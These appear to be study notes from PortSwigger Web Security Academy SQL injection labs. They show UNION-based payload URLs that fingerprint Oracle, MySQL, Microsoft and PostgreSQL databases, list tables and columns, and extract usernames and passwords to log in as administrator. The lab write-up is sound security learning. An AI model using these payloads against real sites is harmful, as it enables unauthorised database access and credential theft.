# SQL injection examining the database

When exploiting SQL injection vulnerabilities, it is often necessary to gather some information about the database itself. This includes the type and version of the database software, and the contents of the database in terms of which tables and columns it contains. 

## Querying the database type and version

Different databases provide different ways of querying their version. You often need to try out different queries to find one that works, allowing you to determine both the type and version of the database software. A list of some popular version of databases can be found in the [cheat sheet for SQLi](https://portswigger.net/web-security/sql-injection/cheat-sheet).

For example, you could use a `UNION` attack with the following input:

```
' UNION SELECT @@version--
```

Example of finding Oracle DB version and informations:

```
First we have to determine the number of cloumns in the return, so as to perform the UNION attack. We found it's 2.

Then, we could retrieve the data with the following request:

https://0ac2007e030f6bacc0184eee00320024.web-security-academy.net/filter?category=Gifts' UNION SELECT NULL,banner FROM v$version--
```

**Important:** In Oracle DB, every `SELECT` must include a `FROM`, so for the first part of the example it could be useful to keep in mind of the table `dual`, always present in Oracle DB!

Example of finding MySQL and Microsoft version and informations:

**Remember:** MySQL wants a space character after the double dash comment; in the request, for example from a browser search bar, a terminating space character could be trimmed, so an useful way to avoid it from happening could be to insert the space in URL encoding, %20, or to add an extra character after the space, that doesn't affect the attack because it will be commented in the query.

```
Finding the number of columns in the query:
https://0a9000a703e73587c1289e0d000900f5.web-security-academy.net/filter?category=Gifts' ORDER BY 2--%20

Make the site display the version of the DB:
https://0a9000a703e73587c1289e0d000900f5.web-security-academy.net/filter?category=Gifts' UNION SELECT NULL,@@version--%20
```

## Listing the contents of the database

Most database types (with the notable exception of Oracle) have a set of views called the information schema which provide information about the database.

You can query `information_schema.tables` to list the tables in the database:

```
SELECT * FROM information_schema.tables
```

You can then query `information_schema.columns` to list the columns in individual tables:

```
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

Example of UNION attack to detect users table and log in as administrator:
```
We know the DB is non-Oracle, so it could be MySQL, PostgreSQL or Microsoft. The following request will work for the three of them:

https://0af1008b04189d62c0ccb95600fd0068.web-security-academy.net/filter?category=Gifts' UNION SELECT NULL,NULL-- d

We found the number of columns, now it's time to extract informations about the tables. We have to keep two columns in the output, so we try to keep the table names:

https://0af1008b04189d62c0ccb95600fd0068.web-security-academy.net/filter?category=Gifts' UNION SELECT NULL, TABLE_NAME FROM information_schema.tables-- d

In the result, some table's names begin with pg_, which is usual for PostgreSQL databases. We assume the database is PostgreSQL.
Found some tables with users as part of the name, gonna try some to see its columns' name. Also in this case, we have to keep two columns in the result:

https://0af1008b04189d62c0ccb95600fd0068.web-security-academy.net/filter?category=Gifts' UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns WHERE table_name = 'users_etclym'--

Found column names username_hcdmth and password_jtrbxr, so this was the correct table. Now we are going to retrieve all usernames and passwords:

https://0af1008b04189d62c0ccb95600fd0068.web-security-academy.net/filter?category=Gifts' UNION SELECT username_hcdmth,password_jtrbxr FROM users_etclym--

Got administrator password, know we can log in.
```

## Equivalent to information schema on Oracle

On Oracle, you can obtain the same information with slightly different queries.

You can list tables by querying `all_tables`:

```
SELECT * FROM all_tables
```

And you can list columns by querying `all_tab_columns`:

```
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```

Example of UNION attack to detect users table and log in as administrator, in Oracle DB:

```
https://0a7200ea048238d1c07b201f00ec0041.web-security-academy.net/filter?category=Gifts ' UNION SELECT NULL,NULL FROM dual--

Found that there are two columns, now going to find all the table to search for users' one:

https://0a7200ea048238d1c07b201f00ec0041.web-security-academy.net/filter?category=Gifts ' UNION SELECT NULL,TABLE_NAME FROM all_tables--

Could scroll to all the tables to find someone with users as part of the name or use a more complicated query, as the following:

https://0a7200ea048238d1c07b201f00ec0041.web-security-academy.net/filter?category=Gifts ' UNION SELECT NULL,TABLE_NAME FROM all_tables WHERE TABLE_NAME LIKE '%USERS%'--

Found table USERS_MGYBJP, seems to be the one. Looking for columns. Needed to search for exact name of COLUMN_NAME on Oracle's documentation:

https://0a7200ea048238d1c07b201f00ec0041.web-security-academy.net/filter?category=Gifts ' UNION SELECT NULL,COLUMN_NAME FROM all_tab_columns WHERE TABLE_NAME = 'USERS_MGYBJP'--

Found column names, listing all usernames and passwords:

https://0a7200ea048238d1c07b201f00ec0041.web-security-academy.net/filter?category=Gifts ' UNION SELECT USERNAME_MCYYNU,PASSWORD_VGNTBS FROM USERS_MGYBJP--

Got administrator password, know we can log in.
```